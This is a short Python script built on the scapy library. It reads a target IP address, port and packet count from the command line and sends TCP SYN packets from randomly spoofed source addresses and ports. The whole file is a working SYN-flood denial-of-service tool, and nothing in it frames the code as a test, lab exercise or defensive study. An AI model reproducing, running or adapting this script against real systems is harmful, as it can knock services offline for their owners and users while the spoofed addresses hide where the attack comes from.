import sys
from scapy.all import *

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randPort():
	x = random.randint(0, 64000)
	return x

dest_ip_address = sys.argv[1]
dest_port = int(sys.argv[2])
pkt_count = int(sys.argv[3])

for i in range(0, pkt_count):
	src_ip = randomIP()
	src_port = randPort()

	packet = IP(src=str(src_ip), dst=dest_ip_address)
	segment = TCP(sport=src_port, dport=dest_port, flags="S")
	pkt = packet/segment
	send(pkt)
